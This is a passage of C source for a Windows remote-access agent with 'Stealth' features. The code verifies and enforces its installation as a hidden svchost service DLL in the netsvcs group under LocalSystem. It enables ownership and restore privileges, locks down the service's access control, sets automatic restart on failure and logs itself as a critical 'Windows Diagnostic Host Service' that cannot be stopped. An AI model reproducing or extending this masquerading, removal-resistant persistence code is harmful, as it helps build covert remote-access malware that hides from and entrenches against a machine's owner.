	printf("\"chainThreadWaitResult\":%lu}\n", (unsigned long)chainThreadWaitResult);
	fflush(stdout);

	return success ? 0 : 1;
}
#endif

typedef struct MeshServiceSvchostStatusSummary
{
	BOOL success;
	DWORD statusMask;
	WCHAR serviceName[256];
	WCHAR expectedServiceDll[MAX_PATH];
	BOOL serviceKeyPresent;
	BOOL serviceTypePresent;
	DWORD serviceTypeValue;
	BOOL serviceTypeValid;
	BOOL serviceStartPresent;
	DWORD serviceStartValue;
	BOOL serviceStartValid;
	BOOL imagePathPresent;
	WCHAR imagePath[512];
	BOOL imagePathIsSvchost;
	BOOL imagePathHasNetsvcs;
	BOOL objectNamePresent;
	WCHAR objectName[256];
	BOOL objectNameIsLocalSystem;
	BOOL paramsKeyPresent;
	BOOL serviceDllPresent;
	WCHAR serviceDllRaw[512];
	WCHAR serviceDllExpanded[1024];
	BOOL serviceDllExists;
	BOOL serviceDllMatchesExpected;
	BOOL hashConfigured;
	WCHAR expectedHash[STEALTH_SHA256_STRING_LENGTH + 1];
	BOOL actualHashAvailable;
	WCHAR actualHash[STEALTH_SHA256_STRING_LENGTH + 1];
	BOOL hashMatch;
	BOOL serviceMainPresent;
	WCHAR serviceMain[128];
	BOOL serviceMainValid;
	BOOL unloadOnStopPresent;
	DWORD unloadOnStopValue;
	BOOL unloadOnStopValid;
	BOOL netsvcsMembershipPresent;
	BOOL scmAvailable;
	BOOL serviceInstalledInScm;
	BOOL currentStateKnown;
	DWORD currentState;
	BOOL serviceRunning;
	BOOL sidTypeKnown;
	DWORD sidTypeValue;
	BOOL sidTypeValid;
	struct {
		BOOL collected;
		DWORD scannedProcessCount;
		DWORD protectedProcessCount;
		DWORD protectedLightCount;
		DWORD entryCount;
		MonitorProcessProtectionInfo entries[MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS];
	} processProtection;
} MeshServiceSvchostStatusSummary;

static void MeshService_CollectProcessProtectionDiagnostics(MeshServiceSvchostStatusSummary* summary)
{
	HANDLE snapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W entry;

	if (summary == NULL) { return; }

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) { return; }

	ZeroMemory(&entry, sizeof(entry));
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snapshot, &entry))
	{
		CloseHandle(snapshot);
		return;
	}

	do
	{
		MonitorProcessProtectionInfo info;

		if (entry.th32ProcessID == 0) { continue; }
		++summary->processProtection.scannedProcessCount;
		ZeroMemory(&info, sizeof(info));
		if (!Monitor_QueryProcessProtectionByPid(entry.th32ProcessID, &info)) { continue; }
		if (!info.protectionKnown || info.protectionType == 0) { continue; }

		if (info.imageName[0] == L'\0')
		{
			StringCchCopyW(info.imageName, _countof(info.imageName), entry.szExeFile);
		}

		if (summary->processProtection.entryCount < MESH_SERVICE_MAX_PROTECTION_DIAGNOSTICS)
		{
			summary->processProtection.entries[summary->processProtection.entryCount++] = info;
		}
		++summary->processProtection.protectedProcessCount;
		if (info.isProtectedLight)
		{
			++summary->processProtection.protectedLightCount;
		}
	} while (Process32NextW(snapshot, &entry));

	CloseHandle(snapshot);
	summary->processProtection.collected = TRUE;
}

static void MeshService_PrintSvchostStatusJson(const MeshServiceSvchostStatusSummary* summary)
{
	DWORD i = 0;

	if (summary == NULL) { return; }

	printf("{\"success\":%s,", summary->success ? "true" : "false");
	printf("\"phase\":\"svchost-status\",");
	printf("\"serviceName\":\"");
	MeshService_PrintJsonEscapedWide(summary->serviceName);
	printf("\",");
	printf("\"statusMask\":%lu,", (unsigned long)summary->statusMask);
	printf("\"statusMaskHex\":\"0x%08lX\",", (unsigned long)summary->statusMask);
	printf("\"checks\":{");
	printf("\"serviceKeyPresent\":%s,", summary->serviceKeyPresent ? "true" : "false");
	printf("\"serviceTypeValid\":%s,", summary->serviceTypeValid ? "true" : "false");
	printf("\"serviceStartValid\":%s,", summary->serviceStartValid ? "true" : "false");
	printf("\"imagePathIsSvchost\":%s,", summary->imagePathIsSvchost ? "true" : "false");
	printf("\"imagePathHasNetsvcs\":%s,", summary->imagePathHasNetsvcs ? "true" : "false");
	printf("\"objectNameIsLocalSystem\":%s,", summary->objectNameIsLocalSystem ? "true" : "false");
	printf("\"serviceDllPresent\":%s,", summary->serviceDllPresent ? "true" : "false");
	printf("\"serviceDllExists\":%s,", summary->serviceDllExists ? "true" : "false");
	printf("\"serviceDllMatchesExpected\":%s,", summary->serviceDllMatchesExpected ? "true" : "false");
	printf("\"hashConfigured\":%s,", summary->hashConfigured ? "true" : "false");
	printf("\"hashMatch\":%s,", summary->hashMatch ? "true" : "false");
	printf("\"serviceMainValid\":%s,", summary->serviceMainValid ? "true" : "false");
	printf("\"unloadOnStopValid\":%s,", summary->unloadOnStopValid ? "true" : "false");
	printf("\"netsvcsMembershipPresent\":%s,", summary->netsvcsMembershipPresent ? "true" : "false");
	printf("\"scmAvailable\":%s,", summary->scmAvailable ? "true" : "false");
	printf("\"serviceInstalledInScm\":%s,", summary->serviceInstalledInScm ? "true" : "false");
	printf("\"serviceRunning\":%s,", summary->serviceRunning ? "true" : "false");
	printf("\"sidTypeValid\":%s", summary->sidTypeValid ? "true" : "false");
	printf("},");
	printf("\"processProtection\":{");
	printf("\"collected\":%s,", summary->processProtection.collected ? "true" : "false");
	printf("\"scannedProcessCount\":%lu,", (unsigned long)summary->processProtection.scannedProcessCount);
	printf("\"protectedProcessCount\":%lu,", (unsigned long)summary->processProtection.protectedProcessCount);
	printf("\"protectedLightCount\":%lu,", (unsigned long)summary->processProtection.protectedLightCount);
	printf("\"entries\":[");
	for (i = 0; i < summary->processProtection.entryCount; ++i)
	{
		const MonitorProcessProtectionInfo* entry = &summary->processProtection.entries[i];
		if (i != 0) { printf(","); }
		printf("{\"pid\":%lu,", (unsigned long)entry->processId);
		printf("\"sessionId\":%lu,", (unsigned long)entry->sessionId);
		printf("\"imageName\":\"");
		MeshService_PrintJsonEscapedWide(entry->imageName);
		printf("\",\"imagePath\":\"");
		MeshService_PrintJsonEscapedWide(entry->imagePath);
		printf("\",\"level\":%u,", (unsigned int)entry->protectionLevel);
		printf("\"typeCode\":%u,", (unsigned int)entry->protectionType);
		printf("\"type\":\"");
		MeshService_PrintJsonEscapedWide(Monitor_GetProtectionTypeName(entry->protectionType));
		printf("\",\"signerCode\":%u,", (unsigned int)entry->protectionSigner);
		printf("\"signer\":\"");
		MeshService_PrintJsonEscapedWide(Monitor_GetProtectionSignerName(entry->protectionSigner));
		printf("\",\"isProtected\":%s,", entry->isProtected ? "true" : "false");
		printf("\"isProtectedLight\":%s", entry->isProtectedLight ? "true" : "false");
		printf("}");
	}
	printf("]},");
	printf("\"values\":{");
	printf("\"expectedServiceDll\":\"");
	MeshService_PrintJsonEscapedWide(summary->expectedServiceDll);
	printf("\",");
	printf("\"serviceType\":%lu,", (unsigned long)summary->serviceTypeValue);
	printf("\"serviceStart\":%lu,", (unsigned long)summary->serviceStartValue);
	printf("\"imagePath\":\"");
	MeshService_PrintJsonEscapedWide(summary->imagePath);
	printf("\",");
	printf("\"objectName\":\"");
	MeshService_PrintJsonEscapedWide(summary->objectName);
	printf("\",");
	printf("\"serviceDllRaw\":\"");
	MeshService_PrintJsonEscapedWide(summary->serviceDllRaw);
	printf("\",");
	printf("\"serviceDllExpanded\":\"");
	MeshService_PrintJsonEscapedWide(summary->serviceDllExpanded);
	printf("\",");
	printf("\"expectedHash\":\"");
	MeshService_PrintJsonEscapedWide(summary->expectedHash);
	printf("\",");
	printf("\"actualHash\":\"");
	MeshService_PrintJsonEscapedWide(summary->actualHash);
	printf("\",");
	printf("\"serviceMain\":\"");
	MeshService_PrintJsonEscapedWide(summary->serviceMain);
	printf("\",");
	printf("\"unloadOnStop\":%lu,", (unsigned long)summary->unloadOnStopValue);
	printf("\"currentState\":%lu,", (unsigned long)summary->currentState);
	printf("\"currentStateName\":\"");
	MeshService_PrintJsonEscapedWide(summary->currentStateKnown ? ServiceStateToString(summary->currentState) : L"UNKNOWN");
	printf("\",");
	printf("\"serviceSidType\":%lu", (unsigned long)summary->sidTypeValue);
	printf("}}\n");
}

static int MeshService_RunSvchostStatusCommand(void)
{
	MeshServiceSvchostStatusSummary summary;
	ZeroMemory(&summary, sizeof(summary));

	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), summary.serviceName, _countof(summary.serviceName));
	if (summary.serviceName[0] == L'\0')
	{
		wcscpy_s(summary.serviceName, _countof(summary.serviceName), STEALTH_FALLBACK_SERVICE_NAME);
	}

	StealthInstallPaths paths;
	ZeroMemory(&paths, sizeof(paths));
	if (Stealth_GetInstallPaths(&paths))
	{
		StringCchCopyW(summary.expectedServiceDll, _countof(summary.expectedServiceDll), paths.dllPath);
	}

	WCHAR keyPath[512] = {0};
	_snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s", summary.serviceName);

	HKEY hKey = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		summary.serviceKeyPresent = TRUE;

		DWORD dw = 0;
		DWORD cb = sizeof(dw);
		if (RegQueryValueExW(hKey, L"Type", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
		{
			summary.serviceTypePresent = TRUE;
			summary.serviceTypeValue = dw;
			summary.serviceTypeValid = (dw == SERVICE_WIN32_SHARE_PROCESS);
			if (!summary.serviceTypeValid) { summary.statusMask |= SVCHOST_STATUS_TYPE_MISMATCH; }
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_TYPE_MISMATCH;
		}

		cb = sizeof(dw);
		if (RegQueryValueExW(hKey, L"Start", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
		{
			summary.serviceStartPresent = TRUE;
			summary.serviceStartValue = dw;
			summary.serviceStartValid = (dw == SERVICE_AUTO_START);
			if (!summary.serviceStartValid) { summary.statusMask |= SVCHOST_STATUS_START_MISMATCH; }
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_START_MISMATCH;
		}

		if (ReadRegStrW(hKey, L"ImagePath", summary.imagePath, _countof(summary.imagePath)))
		{
			WCHAR imagePathUpper[512] = {0};
			summary.imagePathPresent = TRUE;
			StringCchCopyW(imagePathUpper, _countof(imagePathUpper), summary.imagePath);
			_wcsupr_s(imagePathUpper, _countof(imagePathUpper));
			summary.imagePathIsSvchost = (wcsstr(imagePathUpper, L"SVCHOST.EXE") != NULL);
			summary.imagePathHasNetsvcs = (wcsstr(imagePathUpper, L"-K NETSVCS") != NULL);
			if (!summary.imagePathIsSvchost) { summary.statusMask |= SVCHOST_STATUS_IMAGEPATH_INVALID; }
			if (!summary.imagePathHasNetsvcs) { summary.statusMask |= SVCHOST_STATUS_GROUP_ARGUMENT_INVALID; }
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_IMAGEPATH_INVALID;
			summary.statusMask |= SVCHOST_STATUS_GROUP_ARGUMENT_INVALID;
		}

		if (ReadRegStrW(hKey, L"ObjectName", summary.objectName, _countof(summary.objectName)))
		{
			summary.objectNamePresent = TRUE;
			summary.objectNameIsLocalSystem = (_wcsicmp(summary.objectName, L"LocalSystem") == 0);
			if (!summary.objectNameIsLocalSystem) { summary.statusMask |= SVCHOST_STATUS_ACCOUNT_MISMATCH; }
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_ACCOUNT_MISMATCH;
		}

		HKEY hParams = NULL;
		if (RegOpenKeyExW(hKey, L"Parameters", 0, KEY_READ, &hParams) == ERROR_SUCCESS)
		{
			summary.paramsKeyPresent = TRUE;

			if (ReadRegStrW(hParams, L"ServiceDll", summary.serviceDllRaw, _countof(summary.serviceDllRaw)))
			{
				summary.serviceDllPresent = TRUE;
				if (ExpandEnvironmentStringsW(summary.serviceDllRaw, summary.serviceDllExpanded, (DWORD)_countof(summary.serviceDllExpanded)) == 0)
				{
					StringCchCopyW(summary.serviceDllExpanded, _countof(summary.serviceDllExpanded), summary.serviceDllRaw);
				}

				DWORD attrs = GetFileAttributesW(summary.serviceDllExpanded);
				summary.serviceDllExists = (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0);
				if (!summary.serviceDllExists)
				{
					summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
				}

				summary.serviceDllMatchesExpected = (
					summary.expectedServiceDll[0] != L'\0' &&
					_wcsicmp(summary.serviceDllExpanded, summary.expectedServiceDll) == 0);
				if (!summary.serviceDllMatchesExpected)
				{
					summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
				}

				if (summary.serviceDllExists)
				{
					summary.actualHashAvailable = Stealth_ComputeFileSha256W(summary.serviceDllExpanded, summary.actualHash, _countof(summary.actualHash));
					if (!summary.actualHashAvailable)
					{
						Stealth_DebugPrintfW(L"Failed to compute ServiceDll hash for %ls", summary.serviceDllExpanded);
					}
				}
			}
			else
			{
				summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
				summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
			}

			summary.hashConfigured = ReadRegStrW(hParams, L"ServiceDllHash", summary.expectedHash, _countof(summary.expectedHash));
			if (!summary.hashConfigured)
			{
				summary.statusMask |= SVCHOST_STATUS_HASH_NOT_CONFIGURED;
			}
			else
			{
				summary.hashMatch = (summary.actualHashAvailable && _wcsicmp(summary.expectedHash, summary.actualHash) == 0);
				if (!summary.hashMatch)
				{
					summary.statusMask |= SVCHOST_STATUS_DLL_HASH_MISMATCH;
				}
			}

			if (ReadRegStrW(hParams, L"ServiceMain", summary.serviceMain, _countof(summary.serviceMain)))
			{
				summary.serviceMainPresent = TRUE;
				summary.serviceMainValid = (_wcsicmp(summary.serviceMain, L"Stealth_SvchostServiceMain") == 0);
				if (!summary.serviceMainValid)
				{
					summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
				}
			}
			else
			{
				summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
			}

			cb = sizeof(dw);
			if (RegQueryValueExW(hParams, L"ServiceDllUnloadOnStop", NULL, NULL, (LPBYTE)&dw, &cb) == ERROR_SUCCESS)
			{
				summary.unloadOnStopPresent = TRUE;
				summary.unloadOnStopValue = dw;
				summary.unloadOnStopValid = (dw == 1);
				if (!summary.unloadOnStopValid)
				{
					summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
				}
			}
			else
			{
				summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
			}

			RegCloseKey(hParams);
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_DLL_MISSING;
			summary.statusMask |= SVCHOST_STATUS_DLL_PATH_MISMATCH;
			summary.statusMask |= SVCHOST_STATUS_HASH_NOT_CONFIGURED;
			summary.statusMask |= SVCHOST_STATUS_SERVICE_MAIN_MISMATCH;
			summary.statusMask |= SVCHOST_STATUS_UNLOAD_MISMATCH;
		}

		RegCloseKey(hKey);
	}
	else
	{
		summary.statusMask |= SVCHOST_STATUS_MISSING_SERVICE_KEY;
	}

	HKEY hSvchost = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_READ, &hSvchost) == ERROR_SUCCESS)
	{
		DWORD type = 0;
		DWORD cb = 0;
		if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
		{
			wchar_t* multiSz = (wchar_t*)malloc(cb + (2 * sizeof(wchar_t)));
			if (multiSz != NULL)
			{
				if (RegQueryValueExW(hSvchost, L"netsvcs", NULL, &type, (LPBYTE)multiSz, &cb) == ERROR_SUCCESS)
				{
					multiSz[cb / sizeof(wchar_t)] = L'\0';
					multiSz[(cb / sizeof(wchar_t)) + 1] = L'\0';
					for (wchar_t* cursor = multiSz; *cursor != L'\0'; cursor += (wcslen(cursor) + 1))
					{
						if (_wcsicmp(cursor, summary.serviceName) == 0)
						{
							summary.netsvcsMembershipPresent = TRUE;
							break;
						}
					}
				}
				free(multiSz);
			}
		}
		RegCloseKey(hSvchost);
	}
	if (!summary.netsvcsMembershipPresent)
	{
		summary.statusMask |= SVCHOST_STATUS_NOT_IN_NETSVCS;
	}

	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (scm != NULL)
	{
		summary.scmAvailable = TRUE;
		SC_HANDLE svc = OpenServiceW(scm, summary.serviceName, SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
		if (svc != NULL)
		{
			summary.serviceInstalledInScm = TRUE;

			SERVICE_STATUS_PROCESS ssp;
			DWORD bytesNeeded = 0;
			ZeroMemory(&ssp, sizeof(ssp));
			if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
			{
				summary.currentStateKnown = TRUE;
				summary.currentState = ssp.dwCurrentState;
				summary.serviceRunning = (ssp.dwCurrentState == SERVICE_RUNNING);
				if (!summary.serviceRunning)
				{
					summary.statusMask |= SVCHOST_STATUS_NOT_RUNNING;
				}
			}
			else
			{
				summary.statusMask |= SVCHOST_STATUS_NOT_RUNNING;
			}

			SERVICE_SID_INFO sidInfo;
			DWORD sidBytes = sizeof(sidInfo);
			ZeroMemory(&sidInfo, sizeof(sidInfo));
			if (QueryServiceConfig2W(svc, SERVICE_CONFIG_SERVICE_SID_INFO, (LPBYTE)&sidInfo, sizeof(sidInfo), &sidBytes))
			{
				summary.sidTypeKnown = TRUE;
				summary.sidTypeValue = sidInfo.dwServiceSidType;
				summary.sidTypeValid = (sidInfo.dwServiceSidType == SERVICE_SID_TYPE_UNRESTRICTED);
				if (!summary.sidTypeValid)
				{
					summary.statusMask |= SVCHOST_STATUS_SID_MISMATCH;
				}
			}
			else
			{
				summary.statusMask |= SVCHOST_STATUS_SID_MISMATCH;
			}

			CloseServiceHandle(svc);
		}
		else
		{
			summary.statusMask |= SVCHOST_STATUS_NOT_IN_SCM;
		}
		CloseServiceHandle(scm);
	}
	else
	{
		summary.statusMask |= SVCHOST_STATUS_SCM_UNAVAILABLE;
	}

	MeshService_CollectProcessProtectionDiagnostics(&summary);
	summary.success = (summary.statusMask == 0);
	MeshService_PrintSvchostStatusJson(&summary);
	return (int)summary.statusMask;
}

#if defined(WIN32) && defined (_DEBUG) && !defined(_MINCORE)
#include <crtdbg.h>
#define _CRTDBG_MAP_ALLOC
#endif

#include <WtsApi32.h>

static mesh_branding_text_t g_serviceFileText = NULL;
static mesh_branding_text_t g_serviceNameText = NULL;
static TCHAR* serviceFile = NULL;
static TCHAR* serviceName = NULL;

static BOOL MeshService_EnablePrivilege(const wchar_t* privilegeName)
{
	if (privilegeName == NULL || privilegeName[0] == L'\0') { return FALSE; }

	HANDLE token = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
	{
		Stealth_DebugLastErrorW(L"OpenProcessToken (MeshService_EnablePrivilege)");
		return FALSE;
	}

	LUID luid;
	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		Stealth_DebugLastErrorW(L"LookupPrivilegeValueW (MeshService_EnablePrivilege)");
		CloseHandle(token);
		return FALSE;
	}

	TOKEN_PRIVILEGES tp;
	ZeroMemory(&tp, sizeof(tp));
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL))
	{
		Stealth_DebugLastErrorW(L"AdjustTokenPrivileges (MeshService_EnablePrivilege)");
		CloseHandle(token);
		return FALSE;
	}

	DWORD adjustError = GetLastError();
	CloseHandle(token);

	if (adjustError == ERROR_NOT_ALL_ASSIGNED)
	{
		Stealth_DebugPrintfW(L"[ServiceSecurity] Token missing privilege: %ls", privilegeName);
		return FALSE;
	}

	return TRUE;
}

BOOL MeshService_HardenServiceDaclByName(const wchar_t* serviceName)
{
	if (serviceName == NULL || serviceName[0] == L'\0')
	{
		return FALSE;
	}

	MeshService_EnablePrivilege(L"SeTakeOwnershipPrivilege");
	MeshService_EnablePrivilege(L"SeRestorePrivilege");
	MeshService_EnablePrivilege(L"SeBackupPrivilege");
	MeshService_EnablePrivilege(L"SeSecurityPrivilege");

	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (scm == NULL)
	{
		Stealth_DebugLastErrorW(L"OpenSCManagerW (MeshService_HardenServiceDaclByName)");
		return FALSE;
	}

	const DWORD desiredAccess = READ_CONTROL | WRITE_DAC | WRITE_OWNER;
	SC_HANDLE svc = OpenServiceW(scm, serviceName, desiredAccess);
	if (svc == NULL)
	{
		Stealth_DebugLastErrorW(L"OpenServiceW (MeshService_HardenServiceDaclByName)");
		CloseServiceHandle(scm);
		return FALSE;
	}

	BOOL hardened = FALSE;
	PSECURITY_DESCRIPTOR sd = NULL;
	// SYSTEM and Administrators retain full control (including stop/delete/change config).
	LPCWSTR sddl = MESH_SERVICE_DACL_SDDL;

	if (ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &sd, NULL) != FALSE)
	{
		if (SetServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, sd) != FALSE)
		{
			Stealth_DebugPrintfW(L"[ServiceSecurity] Hardened DACL applied to %ls", serviceName);
			hardened = TRUE;
		}
		else
		{
			Stealth_DebugLastErrorW(L"SetServiceObjectSecurity (MeshService_HardenServiceDaclByName)");
		}
		LocalFree(sd);
	}
	else
	{
		Stealth_DebugLastErrorW(L"ConvertStringSecurityDescriptorToSecurityDescriptorW (MeshService_HardenServiceDaclByName)");
	}

	CloseServiceHandle(svc);
	CloseServiceHandle(scm);
	return hardened;
}

static BOOL MeshService_NormalizeSddl(const wchar_t* sddl, wchar_t* normalized, size_t normalizedCch)
{
	if (normalized == NULL || normalizedCch == 0) { return FALSE; }
	normalized[0] = L'\0';
	if (sddl == NULL || sddl[0] == L'\0') { return FALSE; }

	PSECURITY_DESCRIPTOR sd = NULL;
	LPWSTR rendered = NULL;
	BOOL ok = FALSE;

	if (ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &sd, NULL))
	{
		if (ConvertSecurityDescriptorToStringSecurityDescriptorW(sd, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &rendered, NULL))
		{
			if (SUCCEEDED(StringCchCopyW(normalized, normalizedCch, rendered)))
			{
				ok = TRUE;
			}
			LocalFree(rendered);
		}
		LocalFree(sd);
	}
	return ok;
}

BOOL MeshService_ValidateServiceDaclByName(const wchar_t* serviceName, wchar_t* actualSddl, size_t actualSddlCch)
{
	if (actualSddl && actualSddlCch > 0) { actualSddl[0] = L'\0'; }
	if (serviceName == NULL || serviceName[0] == L'\0')
	{
		return FALSE;
	}

	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (scm == NULL)
	{
		Stealth_DebugLastErrorW(L"OpenSCManagerW (MeshService_ValidateServiceDaclByName)");
		return FALSE;
	}

	SC_HANDLE svc = OpenServiceW(scm, serviceName, READ_CONTROL);
	if (svc == NULL)
	{
		Stealth_DebugLastErrorW(L"OpenServiceW (MeshService_ValidateServiceDaclByName)");
		CloseServiceHandle(scm);
		return FALSE;
	}

	DWORD needed = 0;
	QueryServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, NULL, 0, &needed);
	if (needed == 0)
	{
		Stealth_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
		CloseServiceHandle(svc);
		CloseServiceHandle(scm);
		return FALSE;
	}

	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, needed);
	if (sd == NULL)
	{
		CloseServiceHandle(svc);
		CloseServiceHandle(scm);
		return FALSE;
	}

	BOOL ok = FALSE;
	if (QueryServiceObjectSecurity(svc, DACL_SECURITY_INFORMATION, sd, needed, &needed))
	{
		LPWSTR sddl = NULL;
		if (ConvertSecurityDescriptorToStringSecurityDescriptorW(sd, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &sddl, NULL))
		{
			if (actualSddl && actualSddlCch > 0)
			{
				StringCchCopyW(actualSddl, actualSddlCch, sddl);
			}

			wchar_t expectedNorm[512] = {0};
			wchar_t actualNorm[512] = {0};
			if (MeshService_NormalizeSddl(MESH_SERVICE_DACL_SDDL, expectedNorm, _countof(expectedNorm)) &&
			    MeshService_NormalizeSddl(sddl, actualNorm, _countof(actualNorm)))
			{
				ok = (_wcsicmp(expectedNorm, actualNorm) == 0);
			}
			else
			{
				ok = (_wcsicmp(MESH_SERVICE_DACL_SDDL, sddl) == 0);
			}
			LocalFree(sddl);
		}
	}
	else
	{
		Stealth_DebugLastErrorW(L"QueryServiceObjectSecurity (MeshService_ValidateServiceDaclByName)");
	}

	LocalFree(sd);
	CloseServiceHandle(svc);
	CloseServiceHandle(scm);
	return ok;
}

void MeshService_HardenServiceDacl(void)
{
	wchar_t svcName[256];
	if (!MeshService_GetServiceNameW(svcName, _countof(svcName)))
	{
		Stealth_DebugPrintfW(L"[ServiceSecurity] Unable to resolve service name for DACL hardening");
		return;
	}
	MeshService_HardenServiceDaclByName(svcName);
}

static BOOL MeshService_GetServiceNameW(wchar_t* buffer, size_t cchBuffer)
{
	if (buffer == NULL || cchBuffer == 0) { return FALSE; }
	buffer[0] = L'\0';
	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), buffer, cchBuffer);
	if (buffer[0] == L'\0')
	{
		if (wcscpy_s(buffer, cchBuffer, STEALTH_FALLBACK_SERVICE_NAME) != 0)
		{
			return FALSE;
		}
	}
	return TRUE;
}

static BOOL MeshService_ProcessHasSystemSid(void)
{
	BOOL isSystem = FALSE;
	HANDLE token = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
	{
		return FALSE;
	}
	isSystem = MeshService_TokenHasSystemSid(token);
	CloseHandle(token);
	return isSystem;
}

static void MeshService_EnsureRecoveryPolicy(void)
{
	wchar_t svcName[256];
	if (!MeshService_GetServiceNameW(svcName, _countof(svcName)))
	{
		return;
	}

	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
	if (scm == NULL)
	{
		return;
	}

	SC_HANDLE svc = OpenServiceW(scm, svcName, SERVICE_CHANGE_CONFIG);
	if (svc != NULL)
	{
		SC_ACTION actions[3] = {
			{ SC_ACTION_RESTART, 1000 },
			{ SC_ACTION_RESTART, 1000 },
			{ SC_ACTION_RESTART, 1000 }
		};

		SERVICE_FAILURE_ACTIONS sfa;
		ZeroMemory(&sfa, sizeof(sfa));
		sfa.dwResetPeriod = 3600;
		sfa.cActions = (DWORD)_countof(actions);
		sfa.lpsaActions = actions;

		ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);

		SERVICE_FAILURE_ACTIONS_FLAG flag = { TRUE };
		ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &flag);

		CloseServiceHandle(svc);
	}

	CloseServiceHandle(scm);
	MeshService_HardenServiceDacl();
}

static void MeshService_ReportCriticalStopDenial(void)
{
	if (serviceName == NULL)
	{
		return;
	}

	HANDLE eventSource = RegisterEventSourceA(NULL, serviceName);
	if (eventSource != NULL)
	{
		const char* strings[1];
		strings[0] = "The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
		ReportEventA(eventSource,
			EVENTLOG_WARNING_TYPE,
			0,
			0xC0020001,
			NULL,
			1,
			0,
			strings,
			NULL);
		DeregisterEventSource(eventSource);
	}
}
/*
    Provisioning markers are only embedded when MESH_PROVISIONING_HARDCODED is
    defined (test/lab builds). Production builds get provisioning exclusively
    from the .msh file the server embeds at download time.
*/
#ifdef MESH_PROVISIONING_HARDCODED
#ifdef MESH_AGENT_SERVER_ID
static const char g_meshProvisioningServerIdMarker[] = "SERVERID:" MESH_AGENT_SERVER_ID;
#endif
#ifdef MESH_AGENT_MESH_ID
static const char g_meshProvisioningMeshIdMarker[] = "MESHID:" MESH_AGENT_MESH_ID;
#endif
#endif /* MESH_PROVISIONING_HARDCODED */

static void MeshService_TouchProvisioningMarkers(void)
{
#ifdef MESH_PROVISIONING_HARDCODED
	volatile const char* marker = NULL;
#ifdef MESH_AGENT_SERVER_ID
	marker = g_meshProvisioningServerIdMarker;
#endif
#ifdef MESH_AGENT_MESH_ID
	marker = g_meshProvisioningMeshIdMarker;
#endif
	(void)marker;
#endif /* MESH_PROVISIONING_HARDCODED */
}

#ifdef MESHAGENT_ENABLE_STEALTH
static HANDLE g_WatchdogHeartbeatThread = NULL;
static HANDLE g_WatchdogHeartbeatEvent = NULL;
static HANDLE g_WatchdogHeartbeatMapHandle = NULL;
static DWORD g_WatchdogHeartbeatIntervalMs = 8000;
static BOOL g_WatchdogRuntimeActive = FALSE;
static BOOL g_StealthIntegrationReady = FALSE;
static BOOL g_StealthIntegrationRunning = FALSE;
static DWORD WINAPI MeshService_WatchdogHeartbeatThread(LPVOID param);
static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue);
static DWORD MeshService_ReadEnvDword(const wchar_t* name, DWORD defaultValue);
static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* dir, const wchar_t* leaf);
static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config);
